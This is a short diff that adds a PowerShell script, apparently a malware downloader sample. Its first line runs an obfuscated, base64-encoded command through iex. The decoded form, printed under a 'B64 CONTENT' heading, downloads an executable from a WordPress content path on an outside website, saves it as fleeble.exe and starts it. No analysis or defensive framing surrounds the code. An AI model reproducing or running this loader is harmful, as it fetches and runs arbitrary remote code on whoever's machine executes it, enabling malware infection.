@@ -1,0 +1,7 @@
+iex([sysTeM.TExt.EnCodiNG]::utf8.gEtSTRINg([SYStEM.cONvert]::FRoMbASe64stRing('CihOZXctT2JqZWN0IFN5U1RFTS5uRXQud0VCY2xpZU5UKS5Eb3dObE9BRGZJbGUoJ2h0dHA6Ly93d3cudGVsZW1lZGlhLmNvLnphL3dwLWNvbnRlbnQvb3pvbmUvc2xpbS5leGUnLCdmbGVlYmxlLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2ZsZWVibGUuZXhlJwoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SySTEM.nEt.wEBclieNT).DowNlOADfIle('http://www.telemedia.co.za/wp-content/ozone/slim.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
